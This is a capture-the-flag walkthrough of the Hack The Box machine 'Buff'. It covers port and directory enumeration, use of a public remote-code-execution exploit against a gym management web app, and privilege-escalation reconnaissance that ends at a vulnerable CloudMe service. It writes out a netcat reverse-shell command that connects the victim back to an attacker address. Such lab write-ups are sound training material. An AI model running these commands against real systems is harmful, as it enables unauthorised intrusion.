---
title: Buff
draft: false
tags:
---
![[Pasted image 20250304203750.png]]

Machine: https://app.hackthebox.com/machines/263
# Enumeration
## Port Scanning
- using [[content/Tools/Nmap|Nmap]] for service and version scanning
```bash
nmap -p- -sSU -n -Pn --min-rate 5000 10.10.10.198 -oG allPorts
```
>[!example]- Result
>![[Pasted image 20250304203954.png]]

```bash
nmap -p7680,8080 -sVC -n -Pn --min-rate 5000 10.10.10.198 -oN Targeted
```
>[!example]- Result
>![[Pasted image 20250304204404.png]]

## Web site Enumeration
- Used tecnologies
```bash
whatweb http://10.10.10.198:8080
```
>[!example]- Result
>![[Pasted image 20250304204826.png]]

- we can sing in, but we dont have valid credentials
>[!example]- Result
>![[Pasted image 20250304205133.png]]

- Now we can try to preform a directory enumeration using [[gobuster]]
```bash
gobuster dir -u http://10.10.10.198:8080/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --add-slash
```

- we get this:
Information leakage `http://10.10.10.198:8080/profile/`, `http://10.10.10.198:8080/ex/`
>[!example]- Result
>![[Pasted image 20250304205623.png]]
>![[Pasted image 20250304210003.png]]

- After looking for more information, we found the version of the used software
>[!example]- Result
>![[Pasted image 20250304210850.png]]

# Exploitation
- looks like this software version have a RCE vulnerability [link](https://www.exploit-db.com/exploits/48506) (use python2)
```bash
searchsploit Gym Management
python 48506.py http://10.10.10.198:8080/
```
>[!example]- Result
>![[Pasted image 20250304222313.png]]
>![[Pasted image 20250304222540.png]]

- now we can upgrade own session
```bash
rlwrap -cAr nc -nlvp 4444
```
- and on the victim machine
```cmd
\\10.10.16.6\smbFolder\nc.exe -e cmd 10.10.16.6 4444
```
>[!example]- Result
![[Pasted image 20250305111718.png]]
![[Pasted image 20250305111747.png]]

# Privilege Escalation
## Enumerating
- Local opened ports
>[!example]- Result
>![[Pasted image 20250304232133.png]]

- I found a .php whoes porpose is connect to the MySQL data base
>[!example]- Result
>![[Pasted image 20250305112224.png]]
>![[Pasted image 20250305112801.png]]

- Get local users
```cmd
net users
```
>[!example]- Result
>![[Pasted image 20250304235549.png]]
- lets use [[winPEAS]] in order to get more info, and we have NTLMv2
>[!example]- Result
>![[Pasted image 20250305114508.png]]

- But we cant crack it, there are 2 opened ports and we have full access to this executable
>[!example]- Result
>![[Pasted image 20250305115731.png]]
>![[Pasted image 20250305120501.png]]

- so there is a service named CloudMe version 1112 and is running, so lets find more information, and we see that her default port is 8888 and this version is vulnerable
```bash
searchsploit CloudMe
```
>[!example]- Result
>![[Pasted image 20250305121102.png]]

